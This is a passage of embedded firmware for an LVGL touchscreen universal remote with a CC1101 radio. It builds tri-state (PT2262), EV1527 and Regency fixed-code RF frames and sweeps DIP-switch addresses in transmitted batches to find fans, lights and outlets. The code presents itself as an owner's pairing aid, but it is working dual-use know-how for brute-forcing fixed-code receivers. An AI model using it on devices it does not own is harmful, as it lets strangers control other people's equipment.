  lv_obj_set_style_bg_opa(
    footer,
    LV_OPA_TRANSP,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    footer,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    footer,
    lv_color_hex(0x283545),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    footer,
    10,
    LV_PART_MAIN
  );

  lv_obj_set_style_shadow_width(
    footer,
    0,
    LV_PART_MAIN
  );

  lv_obj_set_style_shadow_color(
    footer,
    lv_color_hex(0x001B26),
    LV_PART_MAIN
  );

  lv_obj_set_style_shadow_opa(
    footer,
    LV_OPA_40,
    LV_PART_MAIN
  );

  // The footer is intentionally transparent and currently carries no text.
  // It must never cover or intercept the bottom navigation controls.
  lv_obj_clear_flag(footer, LV_OBJ_FLAG_CLICKABLE);
  lv_obj_clear_flag(footer, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_move_background(footer);


  lv_obj_t *left =
    lv_label_create(footer);


  lv_label_set_text(
    left,
    ""
  );


  lv_obj_set_style_text_color(
    left,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    left,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    left,
    LV_ALIGN_LEFT_MID,
    10,
    0
  );


  lv_obj_t *right =
    lv_label_create(footer);


  lv_label_set_text(
    right,
    ""
  );


  lv_obj_set_style_text_color(
    right,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    right,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    right,
    LV_ALIGN_RIGHT_MID,
    -10,
    0
  );
}


// ============================================================
// GENERIC SECONDARY PAGE
// ============================================================

lv_obj_t *create_page(
  const char *title,
  const char *description,
  uint32_t accent_color
) {

  lv_obj_t *screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  create_header(
    screen,
    title
  );


  lv_obj_t *panel =
    lv_obj_create(screen);


  lv_obj_set_size(
    panel,
    280,
    220
  );


  lv_obj_align(
    panel,
    LV_ALIGN_CENTER,
    0,
    15
  );


  lv_obj_set_style_pad_all(
    panel,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    panel,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    panel,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    panel,
    1,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    panel,
    lv_color_hex(COLOR_BORDER),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    panel,
    16,
    LV_PART_MAIN
  );


  lv_obj_t *description_label =
    lv_label_create(panel);


  lv_label_set_text(
    description_label,
    description
  );


  lv_obj_set_style_text_color(
    description_label,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    description_label,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    description_label,
    LV_ALIGN_TOP_MID,
    0,
    25
  );


  lv_obj_t *coming =
    lv_label_create(panel);


  lv_label_set_text(
    coming,
    "COMING SOON"
  );


  lv_obj_set_style_text_color(
    coming,
    lv_color_hex(accent_color),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    coming,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    coming,
    LV_ALIGN_CENTER,
    0,
    0
  );


  lv_obj_t *home_btn =
    create_button(
      panel,
      55,
      150,
      170,
      48,
      "<  HOME",
      accent_color,
      go_home
    );


  create_footer(
    screen
  );


  return screen;
}


// ============================================================
// RF MAIN SCREEN EVENTS
// ============================================================

void open_universal(
  lv_event_t *e
) {

  lv_scr_load(
    rf_universal_screen
  );

  set_status(
    "UNIVERSAL MODE",
    COLOR_RF
  );
}


void open_known(
  lv_event_t *e
) {

  rf_guided_learning_active = false;
  stop_live_rf_scanner();
  stop_rf_capture();

  lv_scr_load(
    device_type_screen
  );

  set_status(
    "SELECT REMOTE TYPE",
    COLOR_RF
  );
}


// ============================================================
// RF DISCOVERY WORKFLOW
// ============================================================

void update_discovery_screen() {

  if (
    discovery_category_label == NULL ||
    discovery_candidate_label == NULL ||
    discovery_hint_label == NULL
  ) {
    return;
  }


  lv_label_set_text_fmt(
    discovery_category_label,
    "DEVICE TYPE: %s",
    discovery_category
  );


  lv_label_set_text_fmt(
    discovery_candidate_label,
    "SIGNAL SETTINGS: AUTOMATIC\nCANDIDATE %d / %d",
    discovery_candidate_index + 1,
    DISCOVERY_CANDIDATE_COUNT
  );


  if (discovery_has_anchor) {

    lv_label_set_text(
      discovery_hint_label,
      "Response saved as an anchor.\nTry the next related candidate."
    );

  } else {

    lv_label_set_text(
      discovery_hint_label,
      "Hold the remote button, then tap\nAUTO DETECT SIGNAL."
    );
  }
}


void select_discovery_category(const char *category) {

  discovery_category = category;
  discovery_candidate_index = 0;
  discovery_has_anchor = false;
  discovery_anchor_index = -1;

  update_discovery_screen();

  set_status(
    "DISCOVERY READY",
    COLOR_RF
  );
}

void discovery_scan_profile(lv_event_t *e) {
  set_status("LISTENING", COLOR_RF);
  if (scan_rf_profiles()) {
    set_status("SIGNAL SETTINGS READY", COLOR_GREEN);
  } else {
    set_status("NO STRONG RF SIGNAL", COLOR_RED);
  }
  update_discovery_screen();
}


void discovery_unknown(lv_event_t *e) {
  begin_fixed_code_discovery("UNKNOWN", 0, e);
}


void discovery_outlet(lv_event_t *e) {
  begin_fixed_code_discovery("OUTLET / SWITCH", 1, e);
}


void discovery_light(lv_event_t *e) {
  begin_fixed_code_discovery("LIGHT", 2, e);
}


void discovery_fan(lv_event_t *e) {
  begin_fixed_code_discovery("CEILING FAN", 3, e);
}

void discovery_projector(lv_event_t *e) {
  begin_fixed_code_discovery("PROJECTOR", 4, e);
}


void discovery_test_candidate(lv_event_t *e) {

  if (transmit_discovery_candidate()) {
    set_status(
      "TEST SENT - REPORT RESULT",
      COLOR_SETTINGS
    );
  } else {
    set_status(
      "CC1101 NOT READY",
      COLOR_RED
    );
  }
}


void discovery_response_yes(lv_event_t *e) {

  discovery_has_anchor = true;

  save_discovery_anchor();

  set_status(
    "RESPONSE ANCHORED",
    COLOR_GREEN
  );

  update_discovery_screen();
}


void discovery_response_no(lv_event_t *e) {

  if (discovery_candidate_index < DISCOVERY_CANDIDATE_COUNT - 1) {
    discovery_candidate_index++;
    set_status(
      "NEXT CANDIDATE READY",
      COLOR_RF
    );
  } else {
    set_status(
      "NO MORE CANDIDATES",
      COLOR_MUTED
    );
  }

  update_discovery_screen();
}


void discovery_stop(lv_event_t *e) {

  lv_scr_load(
    rf_screen
  );

  set_status(
    "DISCOVERY STOPPED",
    COLOR_MUTED
  );
}


void open_discovery(
  lv_event_t *e
) {
  stop_live_rf_scanner();
  lv_scr_load(
    rf_discovery_screen
  );

  set_status(
    "FIND CONTROLS READY",
    COLOR_RF
  );
}


// ============================================================
// FIXED-CODE RF DISCOVERY
// ============================================================
// This is an intentionally small, manual probe for one common PT2262-style
// fixed-code family.  It is not a universal fan protocol decoder: it sends
// one candidate only after a tap, then waits for the owner to report the
// result before trying anything else.

const char *FIXED_CODE_COMMAND_NAMES[][3] = {
  {"TEST A", "TEST B", "TEST C"},
  {"ON", "OFF", "CHANNEL"},
  {"ON", "OFF", "DIM"},
  {"LIGHT", "POWER", "FAN"},
  {"POWER", "SOURCE", "MENU"}
};
const uint8_t FIXED_CODE_COMMAND_TRITS[][3][4] = {
  {{2, 2, 2, 0}, {2, 2, 2, 1}, {2, 2, 0, 2}},
  {{2, 2, 0, 0}, {2, 2, 0, 1}, {2, 2, 1, 0}},
  {{2, 0, 2, 0}, {2, 0, 2, 1}, {2, 0, 1, 2}},
  {{2, 2, 2, 0}, {2, 2, 2, 1}, {2, 2, 0, 2}},
  {{2, 1, 2, 0}, {2, 1, 2, 1}, {2, 1, 0, 2}}
};
const uint8_t EV1527_COMMAND_VALUES[][3] = {
  {0x1, 0x2, 0x4},
  {0x1, 0x2, 0x4},
  {0x1, 0x2, 0x4},
  {0x1, 0x2, 0x4},
  {0x1, 0x2, 0x4}
};

const char *fixed_code_command_name() {
  if (fixed_code_family == FIXED_CODE_FAMILY_REGENCY &&
      (fixed_code_category_index == 0 || fixed_code_category_index == 3)) {
    const char *const regency_names[] = {"LIGHT ON", "FAN STOP", "SPEED 4"};
    return regency_names[dip_fan_command_index];
  }
  return FIXED_CODE_COMMAND_NAMES[fixed_code_category_index][dip_fan_command_index];
}

const char *fixed_code_family_name() {
  if (fixed_code_family == FIXED_CODE_FAMILY_REGENCY) return "REGENCY";
  return fixed_code_family == FIXED_CODE_FAMILY_EV1527 ? "EV1527" : "TRI-STATE";
}

uint8_t dip_fan_switch_count() {
  if (fixed_code_family == FIXED_CODE_FAMILY_REGENCY) return 4;
  return dip_fan_uses_five_switches ? 5 : 4;
}

uint8_t dip_fan_address_limit() {
  return (1U << dip_fan_switch_count()) - 1;
}

bool build_dip_fan_candidate(uint8_t address, uint8_t command_index,
                              uint8_t profile_index, SavedRfRawCommand &command) {
  if (fixed_code_category_index >= 5 || command_index >= 3 ||
      (profile_index != 2 && profile_index != 6 && profile_index != 7)) return false;

  const uint16_t unit_us = 350;

  // Regency's documented 303.875 MHz format is a 20-bit OOK PPM frame:
  // 576 us start mark, then low/high symbol pairs repeated six times. Its
  // 4-position code switch selects the channel and each frame includes a
  // nibble checksum. This does not reuse the PT2262 trit waveform.
  if (fixed_code_family == FIXED_CODE_FAMILY_REGENCY) {
    if (profile_index != 7 ||
        (fixed_code_category_index != 0 && fixed_code_category_index != 3)) return false;
    const uint8_t regency_command[] = {4, 1, 2};
    const uint8_t regency_value[] = {0xC3, 0xC0, 4};
    // On Regency receivers an OFF switch leaves that address line high, so
    // all four switches OFF is channel 15; ON pulls the corresponding bit low.
    const uint8_t channel = (~address) & 0x0F;
    const uint8_t byte0 = (regency_command[command_index] << 4) | ((~channel) & 0x0F);
    const uint8_t byte1 = regency_value[command_index];
    const uint8_t checksum = ((byte0 >> 4) + (byte0 & 0x0F) +
                              (byte1 >> 4) + (byte1 & 0x0F)) & 0x0F;
    uint8_t decoded[] = {byte0, byte1, checksum};

    memset(&command, 0, sizeof(command));
    command.valid = 1;
    command.profile_index = profile_index;
    command.first_level = 1;
    for (uint8_t repeat = 0; repeat < 6; repeat++) {
      if (command.edge_count + 42 > RF_SAVED_RAW_MAX_EDGES) return false;
      command.durations_us[command.edge_count++] = 576;
      for (uint8_t bit = 0; bit < 20; bit++) {
        const uint8_t source_byte = bit / 8;
        const uint8_t source_bit = bit % 8;
        uint8_t reflected = 0;
        for (uint8_t i = 0; i < 8; i++) {
          reflected |= ((decoded[source_byte] >> i) & 1U) << (7 - i);
        }
        // rtl_433 documents that the on-air payload is inverted.
        const bool on_air_one = ((reflected >> (7 - source_bit)) & 1U) == 0;
        command.durations_us[command.edge_count++] = on_air_one ? 880 : 375;
        command.durations_us[command.edge_count++] = on_air_one ? 450 : 970;
      }
      command.durations_us[command.edge_count++] = 14000;
    }
    return true;
  }

  // EV1527/HS1527 is a common 24-bit fixed-code OOK family used by many
  // inexpensive receivers.  The configurable 4/5-bit pattern is used as the
  // low portion of its address; each test remains a single user-initiated
  // candidate rather than a broadcast sweep.
  if (fixed_code_family == FIXED_CODE_FAMILY_EV1527) {
    const uint32_t payload = ((uint32_t)address << 4) |
                             EV1527_COMMAND_VALUES[fixed_code_category_index][command_index];
    uint16_t one_frame[50];
    uint8_t frame_edges = 0;
    one_frame[frame_edges++] = unit_us;
    one_frame[frame_edges++] = unit_us * 31;
    for (int8_t bit = 23; bit >= 0; bit--) {
      const bool one = (payload & (1UL << bit)) != 0;
      one_frame[frame_edges++] = one ? unit_us * 3 : unit_us;
      one_frame[frame_edges++] = one ? unit_us : unit_us * 3;
    }

    memset(&command, 0, sizeof(command));
    command.valid = 1;
    command.profile_index = profile_index;
    command.first_level = 1;
    for (uint8_t repeat = 0; repeat < 4; repeat++) {
      for (uint8_t edge = 0; edge < frame_edges; edge++) {
        if (command.edge_count >= RF_SAVED_RAW_MAX_EDGES) return false;
        command.durations_us[command.edge_count++] = one_frame[edge];
      }
    }
    return true;
  }

  uint8_t trits[12];
  const uint8_t switch_count = dip_fan_switch_count();
  for (uint8_t i = 0; i < switch_count; i++) {
    trits[i] = (address & (1U << (switch_count - 1 - i))) ? 1 : 0;
  }
  for (uint8_t i = switch_count; i < 8; i++) trits[i] = 2;
  for (uint8_t i = 0; i < 4; i++) {
    trits[8 + i] = FIXED_CODE_COMMAND_TRITS[fixed_code_category_index][command_index][i];
  }

  uint16_t one_frame[50];
  uint8_t frame_edges = 0;
  for (uint8_t i = 0; i < 12; i++) {
    const uint16_t short_mark = unit_us;
    const uint16_t long_mark = unit_us * 3;
    uint16_t first = short_mark;
    uint16_t second = long_mark;
    uint16_t third = short_mark;
    uint16_t fourth = long_mark;
    if (trits[i] == 1) {
      first = long_mark; second = short_mark;
      third = long_mark; fourth = short_mark;
    } else if (trits[i] == 2) {
      first = short_mark; second = long_mark;
      third = long_mark; fourth = short_mark;
    }
    one_frame[frame_edges++] = first;
    one_frame[frame_edges++] = second;
    one_frame[frame_edges++] = third;
    one_frame[frame_edges++] = fourth;
  }
  one_frame[frame_edges++] = unit_us;
  one_frame[frame_edges++] = unit_us * 31;

  memset(&command, 0, sizeof(command));
  command.valid = 1;
  command.profile_index = profile_index;
  command.first_level = 1;
  for (uint8_t repeat = 0; repeat < 4; repeat++) {
    for (uint8_t edge = 0; edge < frame_edges; edge++) {
      if (command.edge_count >= RF_SAVED_RAW_MAX_EDGES) return false;
      command.durations_us[command.edge_count++] = one_frame[edge];
    }
  }
  return true;
}


// Interleave the supported families and switch counts for each address. This
// makes an initial four-item batch compare TRI/EV1527 and 4/5-switch forms at
// the same DIP value instead of sending four nearly identical addresses.
uint8_t dip_fan_search_candidate_count() {
  return fixed_code_category_index == 0 ?
    DIP_FAN_BASE_SEARCH_CANDIDATE_COUNT + DIP_FAN_REGENCY_CANDIDATE_COUNT :
    DIP_FAN_BASE_SEARCH_CANDIDATE_COUNT;
}


bool select_dip_fan_search_candidate(uint8_t index) {
  if (index >= dip_fan_search_candidate_count()) return false;

  if (index >= DIP_FAN_BASE_SEARCH_CANDIDATE_COUNT) {
    // Other / Unknown continues automatically into the complete bounded
    // Regency 304 MHz address set after Tri-State and EV1527 candidates.
    fixed_code_family = FIXED_CODE_FAMILY_REGENCY;
    dip_fan_profile_index = 7;
    dip_fan_uses_five_switches = false;
    dip_fan_address = index - DIP_FAN_BASE_SEARCH_CANDIDATE_COUNT;
    return true;
  }

  if (index < 64) {
    const uint8_t variant = index % 4;
    dip_fan_address = index / 4;
    fixed_code_family = variant >= 2 ? FIXED_CODE_FAMILY_EV1527
                                     : FIXED_CODE_FAMILY_TRISTATE;
    dip_fan_uses_five_switches = (variant & 1U) != 0;
  } else {
    const uint8_t tail = index - 64;
    dip_fan_address = 16 + tail / 2;
    fixed_code_family = (tail & 1U) ? FIXED_CODE_FAMILY_EV1527
                                    : FIXED_CODE_FAMILY_TRISTATE;
    dip_fan_uses_five_switches = true;
  }
  return true;
}


void refresh_dip_fan_discovery() {
  if (dip_fan_state_label == NULL || dip_fan_hint_label == NULL) return;

  const uint8_t switch_count = dip_fan_switch_count();
  char bits[6];
  for (uint8_t i = 0; i < switch_count; i++) {
    bits[i] = (dip_fan_address & (1U << (switch_count - 1 - i))) ? '1' : '0';
  }
  bits[switch_count] = '\0';
  const char *band = dip_fan_profile_index == 7 ? "303.875 MHz" :
                     dip_fan_profile_index == 6 ? "315 MHz" : "433.92 MHz";

  if (dip_fan_group_mode == DIP_FAN_GROUP_BATCH) {
    const uint8_t candidate_count = dip_fan_search_candidate_count();
    const uint8_t next_end = min(candidate_count,
                                 (uint8_t)(dip_fan_group_start + DIP_FAN_GROUP_SIZE));
    lv_label_set_text_fmt(dip_fan_state_label,
                          dip_fan_candidate_sent ? "COMPATIBLE SIGNAL GROUP SENT\nPROGRESS %u / %u" :
                                                   "SEARCHING FOR CONTROLS\nNEXT GROUP %u / %u",
                          next_end, candidate_count);
    lv_label_set_text(dip_fan_hint_label, dip_fan_candidate_sent ?
                      "Did the device respond to the last test?\nYES will narrow those signals one by one." :
                      "Watch the device, then tap START / NEXT GROUP.");
    return;
  }

  if (dip_fan_group_mode == DIP_FAN_GROUP_NARROW) {
    lv_label_set_text_fmt(dip_fan_state_label,
                          "FINDING EXACT MATCH\nTEST %u OF %u",
                          dip_fan_group_offset + 1, dip_fan_group_count);
    lv_label_set_text(dip_fan_hint_label,
                      "Tap TEST ONE, watch the device,\nthen answer YES or NO.");
    return;
  }

  if (dip_fan_working_count > 0 && dip_fan_command_index >= 3) {
    lv_label_set_text_fmt(dip_fan_state_label,
                          "CONTROL SEARCH COMPLETE\n%d CONTROL%s READY",
                          dip_fan_working_count,
                          dip_fan_working_count == 1 ? "" : "S");
    lv_label_set_text(dip_fan_hint_label,
                      "Save the confirmed controls, or\ntry another band/address first.");
    return;
  }

  lv_label_set_text_fmt(dip_fan_state_label,
                        "%s\nTESTING CONTROL: %s",
                        fixed_code_category_name, fixed_code_command_name());
  if (dip_fan_anchor_found) {
    lv_label_set_text(dip_fan_hint_label,
                      "Control saved. Test the next action,\nor tap FINISH to build the remote.");
  } else if (dip_fan_candidate_sent) {
    lv_label_set_text(dip_fan_hint_label,
                      "Signal sent. Did the device respond?\nChoose YES or NO below.");
  } else if (dip_fan_address >= dip_fan_address_limit()) {
    lv_label_set_text(dip_fan_hint_label,
                      "No match in this supported fixed-code set.\nUnsupported or changing codes will not be found.");
  } else {
    lv_label_set_text(dip_fan_hint_label,
                      "Tap START / NEXT GROUP. Watch the device\nwhile each supported signal is tested.");
  }
}


void open_dip_fan_discovery(lv_event_t *e) {
  begin_fixed_code_discovery("CEILING FAN", 3, e);
}


void begin_fixed_code_discovery(const char *category, uint8_t category_index, lv_event_t *e) {
  stop_live_rf_scanner();
  fixed_code_category_name = category;
  fixed_code_category_index = category_index;
  dip_fan_profile_index = 2;
  dip_fan_address = 0;
  dip_fan_uses_five_switches = false;
  fixed_code_family = FIXED_CODE_FAMILY_TRISTATE;
  dip_fan_command_index = 0;
  dip_fan_anchor_found = false;
  dip_fan_candidate_sent = false;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_group_start = 0;
  dip_fan_working_count = 0;
  memset(dip_fan_working_commands, 0, sizeof(dip_fan_working_commands));
  memset(dip_fan_working_names, 0, sizeof(dip_fan_working_names));
  refresh_dip_fan_discovery();
  lv_scr_load(dip_fan_discovery_screen);
  set_status("SUPPORTED FIXED-CODE SEARCH", COLOR_RF);
}


void dip_fan_select_433(lv_event_t *e) {
  dip_fan_profile_index = 2;
  dip_fan_address = 0;
  dip_fan_command_index = 0;
  dip_fan_anchor_found = false;
  dip_fan_candidate_sent = false;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_group_start = 0;
  dip_fan_working_count = 0;
  refresh_dip_fan_discovery();
  set_status("433 MHz SELECTED", COLOR_RF);
}


void dip_fan_select_315(lv_event_t *e) {
  dip_fan_profile_index = 6;
  dip_fan_address = 0;
  dip_fan_command_index = 0;
  dip_fan_anchor_found = false;
  dip_fan_candidate_sent = false;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_group_start = 0;
  dip_fan_working_count = 0;
  refresh_dip_fan_discovery();
  set_status("315 MHz SELECTED", COLOR_RF);
}


void dip_fan_select_304(lv_event_t *e) {
  dip_fan_profile_index = 7;
  dip_fan_address = 0;
  dip_fan_command_index = 0;
  dip_fan_anchor_found = false;
  dip_fan_candidate_sent = false;
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_group_start = 0;
  dip_fan_working_count = 0;
  fixed_code_family = FIXED_CODE_FAMILY_REGENCY;
  dip_fan_uses_five_switches = false;
  refresh_dip_fan_discovery();
  set_status("304 MHz REGENCY", COLOR_RF);
}


void dip_fan_send_test(lv_event_t *e) {
  if (!cc1101_ready || dip_fan_command_index >= 3) {
    set_status(!cc1101_ready ? "CC1101 NOT READY" : "SAVE OR CHANGE BAND", COLOR_RED);
    return;
  }
  if (dip_fan_group_mode == DIP_FAN_GROUP_BATCH) {
    dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  }
  SavedRfRawCommand candidate = {};
  if (!build_dip_fan_candidate(dip_fan_address, dip_fan_command_index,
                               dip_fan_profile_index, candidate) ||
      !replay_saved_rf_raw_command(candidate)) {
    set_status("FIXED-CODE TEST FAILED", COLOR_RED);
    return;
  }
  dip_fan_candidate_sent = true;
  refresh_dip_fan_discovery();
  set_status("TRANSMITTING", COLOR_RF);
  Serial.printf("RF fixed-code signal sent: %s %s %.2f MHz address=%u command=%s\n",
                fixed_code_category_name,
                fixed_code_family_name(),
                RF_PROFILES[dip_fan_profile_index].frequency, dip_fan_address,
                fixed_code_command_name());
}


void dip_fan_send_group(lv_event_t *e) {
  if (!cc1101_ready || dip_fan_command_index >= 3) {
    set_status(!cc1101_ready ? "CC1101 NOT READY" : "SAVE OR RESTART", COLOR_RED);
    return;
  }
  if (fixed_code_family == FIXED_CODE_FAMILY_REGENCY && fixed_code_category_index != 0) {
    set_status("REGENCY: SEND ONE", COLOR_RF);
    return;
  }

  // Starting over after manual/narrow testing begins a fresh coarse scan.
  if (dip_fan_group_mode != DIP_FAN_GROUP_BATCH) {
    dip_fan_group_mode = DIP_FAN_GROUP_BATCH;
    dip_fan_group_start = 0;
  }
  const uint8_t candidate_count = dip_fan_search_candidate_count();
  if (dip_fan_group_start >= candidate_count) {
    dip_fan_group_mode = DIP_FAN_GROUP_OFF;
    dip_fan_candidate_sent = false;
    refresh_dip_fan_discovery();
    set_status("GROUP SEARCH COMPLETE", COLOR_MUTED);
    return;
  }

  dip_fan_group_count = min((uint8_t)DIP_FAN_GROUP_SIZE,
                            (uint8_t)(candidate_count - dip_fan_group_start));
  uint8_t sent_count = 0;
  for (uint8_t i = 0; i < dip_fan_group_count; i++) {
    if (!select_dip_fan_search_candidate(dip_fan_group_start + i)) continue;
    SavedRfRawCommand candidate = {};
    if (build_dip_fan_candidate(dip_fan_address, dip_fan_command_index,
                                dip_fan_profile_index, candidate) &&
        replay_saved_rf_raw_command(candidate)) {
      sent_count++;
    }
    // Give the receiver and the user enough separation to observe a change.
    delay(220);
  }

  select_dip_fan_search_candidate(dip_fan_group_start);
  dip_fan_candidate_sent = sent_count > 0;
  refresh_dip_fan_discovery();
  set_status(sent_count == dip_fan_group_count ? "GROUP TRANSMITTED" :
             "GROUP PARTLY SENT", sent_count > 0 ? COLOR_RF : COLOR_RED);
}


void dip_fan_worked(lv_event_t *e) {
  if (!dip_fan_candidate_sent || dip_fan_command_index >= 3) {
    set_status("SEND A TEST FIRST", COLOR_RED);
    return;
  }
  if (dip_fan_group_mode == DIP_FAN_GROUP_BATCH) {
    dip_fan_group_mode = DIP_FAN_GROUP_NARROW;
    dip_fan_group_offset = 0;
    dip_fan_candidate_sent = false;
    select_dip_fan_search_candidate(dip_fan_group_start);
    refresh_dip_fan_discovery();
    set_status("VERIFY GROUP ONE BY ONE", COLOR_GREEN);
    return;
  }
  if (dip_fan_group_mode == DIP_FAN_GROUP_NARROW) {
    dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  }
  SavedRfRawCommand &saved = dip_fan_working_commands[dip_fan_working_count];
  if (!build_dip_fan_candidate(dip_fan_address, dip_fan_command_index,
                               dip_fan_profile_index, saved)) {
    set_status("COULD NOT SAVE TEST", COLOR_RED);
    return;
  }
  strncpy(dip_fan_working_names[dip_fan_working_count],
          fixed_code_command_name(),
          sizeof(dip_fan_working_names[dip_fan_working_count]) - 1);
  dip_fan_working_count++;
  dip_fan_anchor_found = true;
  dip_fan_candidate_sent = false;
  if (dip_fan_command_index < 2) dip_fan_command_index++;
  else dip_fan_command_index = 3;
  discovery_button_naming = true;
  if (rf_button_name_screen == NULL) create_rf_button_name_screen();
  lv_textarea_set_text(rf_button_name_textarea,
                       dip_fan_working_names[dip_fan_working_count - 1]);
  lv_scr_load(rf_button_name_screen);
  set_status("CONTROL FOUND - NAME IT", COLOR_GREEN);
}


void dip_fan_no_response(lv_event_t *e) {
  if (!dip_fan_candidate_sent) {
    set_status("SEND A TEST FIRST", COLOR_RED);
    return;
  }
  dip_fan_candidate_sent = false;
  if (dip_fan_group_mode == DIP_FAN_GROUP_BATCH) {
    dip_fan_group_start += dip_fan_group_count;
    const uint8_t candidate_count = dip_fan_search_candidate_count();
    if (dip_fan_group_start >= candidate_count) {
      dip_fan_group_mode = DIP_FAN_GROUP_OFF;
    }
    refresh_dip_fan_discovery();
    set_status(dip_fan_group_start < candidate_count ?
               "NEXT GROUP READY" : "GROUP SEARCH COMPLETE", COLOR_RF);
    return;
  }
  if (dip_fan_group_mode == DIP_FAN_GROUP_NARROW) {
    dip_fan_group_offset++;
    if (dip_fan_group_offset < dip_fan_group_count) {
      select_dip_fan_search_candidate(dip_fan_group_start + dip_fan_group_offset);
      refresh_dip_fan_discovery();
      set_status("NEXT VERIFY CANDIDATE", COLOR_RF);
    } else {
      // A batch reaction that none of its individual candidates reproduces
      // was likely unrelated RF activity; resume after that batch.
      dip_fan_group_start += dip_fan_group_count;
      dip_fan_group_mode = DIP_FAN_GROUP_BATCH;
      refresh_dip_fan_discovery();
      set_status("REACTION NOT REPRODUCED", COLOR_MUTED);
    }
    return;
  }
  if (dip_fan_anchor_found) {
    if (dip_fan_command_index < 2) dip_fan_command_index++;
    else dip_fan_command_index = 3;
  } else if (dip_fan_address < dip_fan_address_limit()) {
    dip_fan_address++;
  }
  refresh_dip_fan_discovery();
  set_status(dip_fan_address >= dip_fan_address_limit() && !dip_fan_anchor_found ?
             "TRY ANOTHER SIGNAL" : "NEXT TEST READY", COLOR_RF);
}


void dip_fan_save_remote(lv_event_t *e) {
  if (dip_fan_working_count == 0) {
    set_status("CONFIRM A COMMAND FIRST", COLOR_RED);
    return;
  }
  universal_button_count = dip_fan_working_count;
  memset(universal_button_names, 0, sizeof(universal_button_names));
  memset(universal_working_rf_commands, 0, sizeof(universal_working_rf_commands));
  for (uint8_t i = 0; i < dip_fan_working_count; i++) {
    strncpy(universal_button_names[i], dip_fan_working_names[i],
            sizeof(universal_button_names[i]) - 1);
    universal_working_rf_commands[i] = dip_fan_working_commands[i];
  }
  universal_remote_loaded_from_save = false;
  rf_smart_learn_category = fixed_code_category_name;
  refresh_universal_remote();
  lv_scr_load(universal_remote_screen);
  set_status("FIXED-CODE REMOTE READY", COLOR_GREEN);
}


// When guessed fixed-code packets do not match, copy the owner's original
// remote instead. Preserve the band selected on this screen; the general
// Smart Learn entry point intentionally defaults to 433 MHz.
void copy_dip_fan_original(lv_event_t *e) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  rf_smart_learn_category = "FAN";
  if (rf_profile_index != dip_fan_profile_index) {
    apply_rf_profile(dip_fan_profile_index);
  }
  start_new_universal_remote(e);
  set_status("COPY FAN REMOTE", COLOR_RF);
}


void refresh_dip_fan_config() {
  if (dip_fan_config_label == NULL) return;

  const uint8_t switch_count = dip_fan_switch_count();
  char bits[6];
  for (uint8_t i = 0; i < switch_count; i++) {
    bits[i] = (dip_fan_address & (1U << (switch_count - 1 - i))) ? '1' : '0';
  }
  bits[switch_count] = '\0';
  lv_label_set_text_fmt(dip_fan_config_label,
                        "%s FAMILY\n%d SWITCHES  |  %s\nTap a switch to toggle it.",
                        fixed_code_family_name(), switch_count, bits);

  for (uint8_t i = 0; i < 5; i++) {
    if (dip_fan_bit_buttons[i] == NULL) continue;
    if (i >= switch_count) {
      lv_obj_add_flag(dip_fan_bit_buttons[i], LV_OBJ_FLAG_HIDDEN);
      continue;
    }
    const bool on = (dip_fan_address & (1U << (switch_count - 1 - i))) != 0;
    lv_label_set_text_fmt(lv_obj_get_child(dip_fan_bit_buttons[i], 0),
                          "DIP %d\n%s", i + 1, on ? "ON" : "OFF");
    lv_obj_set_style_border_color(dip_fan_bit_buttons[i],
                                  lv_color_hex(on ? COLOR_GREEN : COLOR_SETTINGS),
                                  LV_PART_MAIN);
    lv_obj_clear_flag(dip_fan_bit_buttons[i], LV_OBJ_FLAG_HIDDEN);
  }
}


void open_dip_fan_config(lv_event_t *e) {
  if (dip_fan_config_screen == NULL) create_dip_fan_config_screen();
  refresh_dip_fan_config();
  lv_scr_load(dip_fan_config_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void dip_fan_use_four_switches(lv_event_t *e) {
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_uses_five_switches = false;
  dip_fan_address = 0;
  dip_fan_candidate_sent = false;
  refresh_dip_fan_config();
}


void dip_fan_use_five_switches(lv_event_t *e) {
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  dip_fan_uses_five_switches = true;
  dip_fan_address = 0;
  dip_fan_candidate_sent = false;
  refresh_dip_fan_config();
}


void dip_fan_use_tristate(lv_event_t *e) {
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  fixed_code_family = FIXED_CODE_FAMILY_TRISTATE;
  dip_fan_address = 0;
  dip_fan_candidate_sent = false;
  refresh_dip_fan_config();
}


void dip_fan_use_ev1527(lv_event_t *e) {
  dip_fan_group_mode = DIP_FAN_GROUP_OFF;
  fixed_code_family = FIXED_CODE_FAMILY_EV1527;
  dip_fan_address = 0;
